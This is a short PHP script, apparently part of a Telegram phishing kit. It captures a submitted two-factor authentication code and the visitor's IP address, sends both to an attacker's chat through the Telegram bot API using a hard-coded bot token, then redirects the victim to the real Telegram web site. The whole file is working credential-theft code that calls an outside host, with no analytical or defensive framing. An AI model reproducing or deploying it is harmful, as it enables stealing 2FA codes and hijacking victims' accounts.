<?php
$login = $_POST['login'];
$ip = $_SERVER['REMOTE_ADDR'];
$token = '5702428982:AAGAXf8JuxuWxZSenYv3gh5GXrSnBQZQHyU';
$chatid = '956550724';
$send = file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&parse_mode=html&text=Был выполнен вход!%0A2FA-код: {$login}%0AIP: {$ip}");
?>

<head>
<meta http-equiv="refresh" content="1;URL=http://web.telegram.org" />
</head>